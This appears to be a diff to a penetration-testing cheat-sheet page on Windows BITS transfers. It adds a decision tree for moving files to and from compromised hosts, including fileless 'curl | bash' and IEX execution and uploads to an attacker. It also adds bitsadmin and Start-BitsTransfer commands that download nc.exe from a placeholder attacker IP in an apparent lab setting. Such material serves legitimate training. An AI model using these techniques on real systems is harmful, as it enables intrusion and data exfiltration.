@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=bits-transfer) · [All tools](/index)
+
 ## Commands
 
 **Windows PowerShell**
@@ -22,8 +24,78 @@ Start-BitsTransfer -Source 'http://KALI_IP:8000/file.exe' -Destination 'C:\Users
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=Start-BitsTransfer)
+## Notebook recipes
 
-## Learning and original examples
+4 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="Quick Decision Tree">
+
+### Quick Decision Tree
+
+**File Transfers for Linux and Windows**
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+</Accordion>
+
+<Accordion title="Windows LOLBins">
+
+### Windows LOLBins
+
+**File Transfers for Linux and Windows**
+
+```cmd
+bitsadmin /transfer wcb /priority foreground http://<IP>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+**File Transfers for Linux and Windows**
+
+```powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://<IP>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+
+</Accordion>
+
+<Accordion title="User Agent Detection">
+
+### User Agent Detection
+
+**File Transfers for Linux and Windows**
+
+Context from the notebook: BITS ( Start-BitsTransfer ) Microsoft BITS/7.8
+
+```text
+Start-BitsTransfer
+```
+
+</Accordion>
+
+</AccordionGroup>
